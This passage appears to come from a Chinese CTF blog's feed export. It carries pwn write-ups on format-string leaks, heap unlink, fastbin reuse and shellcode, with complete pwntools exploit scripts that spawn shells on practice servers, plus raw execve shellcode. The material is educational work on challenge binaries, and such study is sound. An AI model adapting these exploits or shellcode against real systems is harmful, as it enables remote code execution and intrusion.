payload <span class=\"token operator\">=</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x73</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ogg<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span>\n    <span class=\"token comment\"># q：为什么要 -2 ？</span>\n    <span class=\"token comment\"># a：因为堆块头部包含了 0x10 大小</span>\n    \n    <span class=\"token comment\"># dbg()</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span> <span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span>\n    \n    <span class=\"token comment\"># p.success(getShell())</span>\n    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nattack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   sftpwn-wp.py\n@Time    :   2022/01/26 16:20:33\n@Author  :   Niyah \n'''</span></code></pre>\n",
            "tags": [
                "CTF",
                "PWN",
                "格式化字符串"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/",
            "url": "http://niyah.cn/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/",
            "title": "记一道Unlink",
            "date_published": "2021-04-02T14:10:27.000Z",
            "content_html": "<blockquote>\n<p>unlink</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"axb_2019_heap\"><a class=\"markdownIt-Anchor\" href=\"#axb_2019_heap\">#</a> axb_2019_heap</h1>\n<h2 id=\"初探\"><a class=\"markdownIt-Anchor\" href=\"#初探\">#</a> 初探</h2>\n<p>保护全开，特别哈人</p>\n<center><img src=\"/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/1.png\"></center>\n<p>接下来打开 IDA 康康，可以发现开始有一个格式化字符串漏洞，那么我们可以用格式化字符串泄露栈上的值，那么我们最好是可以通过这个泄露出开 PIE 后的基地址和 libc 的基地址，这样就方便后面的操作</p>\n<center><img src=\"/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/2.png\"></center>\n<p>输入函数存在可以溢出一个字节存在 off-by-one~~，既然存在 off-by-one 那么理应是有几种利用方法的，但我觉得 Unlink 更加 OK（~~</p>\n<center><img src=\"/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/3.png\"></center>\n<h2 id=\"泄露地址\"><a class=\"markdownIt-Anchor\" href=\"#泄露地址\">#</a> 泄露地址</h2>\n<p>我们在利用格式化字符串进行泄露时，我们可以动态调试一下，去看看栈上有哪些可以利用的地方，并且格式化字符串也并不是一次只能泄露出一个地址，我们可以贪心地把我们需要的栈上变量都泄露出来</p>\n<p>这里我们寻找栈上的变量直接发现第 10 个和第 14 个就是我们需要泄露的数据，（当然这里也可以找别的，只要能算出来就行…），又由于 64 位传参，前 6 个参数不在栈上所以是 10 + 6-1 和 14 + 6-1 为什么 - 1 懂的都懂</p>\n<blockquote>\n<p>%15$p,%19$p</p>\n</blockquote>\n<center><img src=\"/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/4.png\"></center>\n<p>泄露之后我们就可以把开 PIE 后的基地址算出来，最后把指针数组的地址算出来就可以进行下一步利用了；</p>\n<h2 id=\"unlink\"><a class=\"markdownIt-Anchor\" href=\"#unlink\">#</a> Unlink</h2>\n<ol>\n<li>\n<p>我们先申请 4 个堆块，既然要造成 Unlink<sup class=\"footnote-ref\"><a href=\"#fn1\" id=\"fnref1\">[1]</a></sup>，那么 free 的那个大小应该至少属于 unsortedbin，大小大于 0x88 就可以，这里我们申请 0x98 大小的堆块，刚好就可以溢出到下一个堆块的 size 位</p>\n</li>\n<li>\n<p>改写一个 unsortedbin 之前的堆块，伪造出<kbd>fake_chunk</kbd>的结构（在一个正常堆块里伪造出一个 bin 结构）</p>\n</li>\n</ol>\n<blockquote>\n<p>提一嘴为什么是 ptr-0x8，因为我首先 malloc 了一个 chunk 没用它，其后我们要找一个指针指向我们的第二个 chunk 的数据段，当然就应该找数组存放的第二个指针了，用这个指针构造出一前一后两个 chunk 和<kbd>fake_chunk</kbd>相互 link 的假象，那么再释放第三个 chunk 时就会触发 Unlink，让其和前一个<kbd>fake_chunk</kbd>合并，合并的时候<kbd>fake_chunk</kbd>和数组 chunk 解连接，让数组的一个指针指向自己，完成 unlink</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"></th>\n<th style=\"text-align:center\">0xA1</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">pre_size=0</td>\n<td style=\"text-align:center\">size=0x80</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">fd=ptr-0x8</td>\n<td style=\"text-align:center\">bk=ptr</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">…</td>\n<td style=\"text-align:center\">…</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">0x80</td>\n<td style=\"text-align:center\">0xa0</td>\n</tr>\n</tbody>\n</table>\n<ol start=\"3\">\n<li>删除第三个堆块，让触发 unlink，这里数组的第二个指针指向了数组地址 - 0x8 位置</li>\n</ol>\n<center><img src=\"/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/5.png\"></center>\n<h2 id=\"getshell\"><a class=\"markdownIt-Anchor\" href=\"#getshell\">#</a> Getshell</h2>\n<ol>\n<li>修改<kbd>free_hook</kbd>成为<kbd>system</kbd>函数的地址，<s>这题保护全开只能改<kbd>free_hook</kbd>，不然还可以改 atoi 函数</s></li>\n<li>删除第四个块，执行 system (&quot;/bin/sh&quot;) 成功 getshell</li>\n</ol>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h2>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#coding=utf-8</span>\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\nlibc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./libc/libc-2.23.so\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#p = process(\"./axb_2019_heap\")</span>\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">\"debug\"</span>\np <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">26984</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n    pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">choice</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tp<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>text<span class=\"token operator\">=</span><span class=\"token string\">\"aaaa\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tchoice<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tchoice<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>text<span class=\"token operator\">=</span><span class=\"token string\">\"aaaa\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tchoice<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#gdb.attach(p)</span>\n<span class=\"token comment\">#格式化字符串漏洞利用</span>\np<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Enter your name: \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"%15$p,%19$p\"</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello, \"</span><span class=\"token punctuation\">)</span>\nlibc_start_main <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x7fcd46b5f830\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">240</span>\nlibc_base <span class=\"token operator\">=</span> libc_start_main <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"__libc_start_main\"</span><span class=\"token punctuation\">]</span>\n\nlog<span class=\"token punctuation\">.</span>warn<span class=\"token punctuation\">(</span><span class=\"token string\">\"libc_start_main: \"</span><span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">)</span>\nbase <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x7fcd46b5f830\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x116a</span>\nlog<span class=\"token punctuation\">.</span>warn<span class=\"token punctuation\">(</span><span class=\"token string\">\"base: \"</span><span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nnote_addr <span class=\"token operator\">=</span> arry <span class=\"token operator\">=</span> <span class=\"token number\">0x202060</span> <span class=\"token operator\">+</span> base\nfree_hook <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"__free_hook\"</span><span class=\"token punctuation\">]</span>\nsystem_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span>\n\nlog<span class=\"token punctuation\">.</span>warn<span class=\"token punctuation\">(</span><span class=\"token string\">\"note_addr: \"</span><span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>note_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x98</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span><span class=\"token string\">'/bin/sh\\x00\\n'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#unlink</span>\npayload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>note_addr<span class=\"token operator\">-</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>note_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x70</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\xa0\"</span>\n\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#getshell</span>\npayload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>free_hook<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>payload<span class=\"token operator\">+</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#dbg()</span>\n\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"\\n\"</span> <span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<hr class=\"footnotes-sep\">\n<section class=\"footnotes\">\n<ol class=\"footnotes-list\">\n<li id=\"fn1\" class=\"footnote-item\"><p><a href=\"https://blog.csdn.net/qq_41202237/article/details/108481889\">一篇博客弄懂 Unlink</a> <a href=\"#fnref1\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n</ol>\n</section>\n",
            "tags": [
                "PWN",
                "格式化字符串",
                "堆",
                "BUUCTF",
                "unlink"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/shellcode%E4%BE%8B%E9%A2%98/",
            "url": "http://niyah.cn/CTF/shellcode%E4%BE%8B%E9%A2%98/",
            "title": "shellcode例题",
            "date_published": "2021-03-28T06:10:27.000Z",
            "content_html": "<p>一直不是很会的一个点</p>\n<a id=\"more\"></a>\n<h2 id=\"b0verfl0w\"><a class=\"markdownIt-Anchor\" href=\"#b0verfl0w\">#</a> b0verfl0w</h2>\n<p>自己构造一下汇编指令</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#coding=utf-8</span>\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\ncontext<span class=\"token punctuation\">.</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span>\np<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"29624\"</span><span class=\"token punctuation\">)</span>\n\nshellcode <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x31\\xc9\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc0\\xb0\\x0b\\xcd\\x80\"</span>\n\ngad_get <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''\nsub esp,0x28;\ncall esp\n'''</span>\ngad_get <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>gad_get<span class=\"token punctuation\">)</span>\njmp_esp<span class=\"token operator\">=</span><span class=\"token number\">0x08048504</span>\npayload<span class=\"token operator\">=</span>shellcode<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"bbbb\"</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>jmp_esp<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>gad_get\n\np<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"your name?\"</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<h2 id=\"orw\"><a class=\"markdownIt-Anchor\" href=\"#orw\">#</a> orw</h2>\n<p>open read write shellcode</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\np <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node3.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25346</span><span class=\"token punctuation\">)</span>\n\nshellcode <span class=\"token operator\">=</span> shellcraft<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/flag'</span><span class=\"token punctuation\">)</span>\nshellcode <span class=\"token operator\">+=</span> shellcraft<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'esp'</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span>\nshellcode <span class=\"token operator\">+=</span> shellcraft<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'esp'</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span>\n\nshellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'shellcode:'</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span>\n\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<h2 id=\"picoctf_2018_shellcode\"><a class=\"markdownIt-Anchor\" href=\"#picoctf_2018_shellcode\">#</a> PicoCTF_2018_shellcode</h2>\n<p>程序自己直接会执行输入的 shellcode</p>\n<center><img src=\"/CTF/shellcode%E4%BE%8B%E9%A2%98/ez.png\"></center>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\np<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node3.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28126</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre>\n",
            "tags": [
                "CTF",
                "PWN",
                "BUUCTF",
                "shellcode"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/",
            "url": "http://niyah.cn/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/",
            "title": "堆溢出",
            "date_published": "2021-02-26T06:10:27.000Z",
            "content_html": "<blockquote>\n<p>堆溢出，最最最简单</p>\n</blockquote>\n<a id=\"more\"></a>\n<h2 id=\"summoner\"><a class=\"markdownIt-Anchor\" href=\"#summoner\">#</a> Summoner</h2>\n<h3 id=\"热知识\"><a class=\"markdownIt-Anchor\" href=\"#热知识\">#</a> 热知识</h3>\n<blockquote>\n<p>​\t在做这道题目之前，我们首先需要了解一些堆的基本概念，堆不同于栈，栈在程序运行时会自己出现，堆是动态分配的 (由操作系统内核或者堆管理器)，只有在程序中需要时才会分配。在 CTF 的 pwn 中，栈是程序加载进内存后就会出现，而堆是由<kbd>malloc</kbd>、<kbd>alloc</kbd>、<kbd>realloc </kbd>函数分配内存后才会出现。</p>\n</blockquote>\n<p>​\t以 64 位程序为例子，在用户申请堆块后，系统便会给用户划分一块内存 (chunk) 供用户使用，这块内存通常如下图所示，这是用户在使用中的情况。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">如下</th>\n<th style=\"text-align:center\"></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">pre size</td>\n<td style=\"text-align:center\">size</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">用户数据</td>\n<td style=\"text-align:center\">用户数据</td>\n</tr>\n</tbody>\n</table>\n<p>​\t可以看到 chunk 的大小并不等于用户申请的大小，而是比用户申请的大 0x10 个字节，这多出来的部分通产用来存放 chunk 的信息。</p>\n<blockquote>\n<p>size 位 ：这里存放的是当前 chunk 的大小 (包括 chunk 头)，而我们知道，64 位程序通常以 8 字节对齐，在一般情况下，chunk 的大小都是 0x8 的整数倍，而 1 字节由八个 bit 组成，以 0x8 为最小单位则低三位恒为零，所以这三位存放的是 chunk 的状态。</p>\n<blockquote>\n<p>0 0 0 0 1 0 0 0    =   0x8</p>\n</blockquote>\n<p>目前我们只需要要知道最低位 PREV_INUSE ，它记录前一个 (物理距离) chunk 是否被使用。</p>\n<p>pre size 位 ：这个位置比较灵活，在 PREV_INUSE 为 1 时，可以被上一个块使用，在 PREV_INUSE 为 0 时，记录上一个块的大小。</p>\n</blockquote>\n<p>​\t所以当我们执行 malloc (0x10) 时，得到的大小通常是 0x21。</p>\n<p>​\t<kbd>malloc</kbd>函数返回的是一个指向用户数据段的一个指针，我们可以通过<kbd>free</kbd>函数释放这个指针，在我们执行 free 操作释放指针后，chunk 会发生一些改变并根据一定的规则放入 bin 中，其中便有 fast bin、unsorted bin、small bin、large bin，fast bin 为单向链表，其他的都是双向链表，0x20 大小的 chunk 被释放后如下</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">如下</th>\n<th style=\"text-align:center\"></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">pre size</td>\n<td style=\"text-align:center\">size</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">fd</td>\n<td style=\"text-align:center\">用户数据</td>\n</tr>\n</tbody>\n</table>\n<p>​\t一般小于等于 0x80 大小的 chunk 被 free 掉之后会被放入相应大小的 fast bin 中，当用户再次申请相应大小的块时，系统会在 fast bin 中把那个块从链表末尾捡回来，既然是单向链表，则新增加的 fd 位自然是指向上个 chunk 的 pre size 地址</p>\n<h3 id=\"开始做题\"><a class=\"markdownIt-Anchor\" href=\"#开始做题\">#</a> 开始做题</h3>\n<p>​\t拿到题目进行分析，发现保护全开，这在堆题目里其实是很常见的</p>\n<center><img src=\"/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/1-1.png\"></center>\n<p>​\t先不慌我们先运行一下</p>\n<center><img src=\"/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/1-2.png\"></center>\n<p>​\t根据题目描述大概是，让我们想办法召唤一只 level5 的怪兽和对面召唤的 level5 的怪兽撞过去</p>\n<blockquote>\n<p>​\t题目提供了几种命令：</p>\n<ul>\n<li>展示召唤物信息</li>\n<li>召唤一只生物，并给它起名字</li>\n<li>设置生物的等级，但必须小于 5</li>\n<li>攻击敌方召唤物</li>\n<li>释放召唤物</li>\n</ul>\n</blockquote>\n<p>​\t在 IDA 分析过后可以发现还是有点问题的，首先是<kbd>strdup</kbd>函数，其返回一个指针，指向为复制字符串分配的空间，这个空间的大小是由我们决定的，其次是释放命令，它在使用后仅仅是把指针清空，并没有将我们用户的数据进行清空</p>\n<p>​\t接下来我们构造脚本进行攻击，我们在进行召唤一个怪兽和升四级之后，他们的堆块变成了这个样子</p>\n<blockquote>\n<p>summor aaa</p>\n<p>level-up 4</p>\n</blockquote>\n<center><img src=\"/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/1-3.png\"></center>\n<p>​\t我们可以看见 2 号箭头指向的 616161 就是怪兽的名字 aaa，1 号箭头指向的为怪兽等级 4，3 号箭头指向了怪兽名字的地址，在这个时候，我们也就对这个召唤物的成分有了一些认识</p>\n<p>​\t首先，在进行召唤过后，系统会自动 malloc 一个 chunk，其大小为 0x10，他的前 0x8 字节存放怪兽名字的地址，后 0x8 字节存放怪兽的等级，之后解放掉这只怪兽</p>\n<center><img src=\"/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/1-4.png\"></center>\n<p>​\t存放解放怪兽姓名的 chunk 会被 free 掉进入 bin 中</p>\n<center><img src=\"/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/1-5.png\"></center>\n<p>​\t当我们再次召唤时，便会将以收入 bin 中的 0x20 大小的块捡回来使用，而最开始输入的姓名不限长度，用户数据又不会清空，那么我们大可以把前一个 0x8 字节填满，溢出到下一个 0x8 字节，所以我们只需在最初召唤时溢出一个字节来存放等级，解放掉，再次申请回来时，那个块的前 0x8 个字节依然存放姓名指针，而后 0x8 个字节便是我们残留的等级</p>\n<center><img src=\"/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/1-6.png\"></center>\n<p>​\t再次召唤后进行攻击就能 getshell 了</p>\n<center><img src=\"/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/1-7.png\"></center>\n<p>​\t脚本十分简单</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\n<span class=\"token comment\">#p =process(\"./summoner\")</span>\np <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">25153</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">new</span><span class=\"token punctuation\">(</span> name <span class=\"token punctuation\">)</span><span 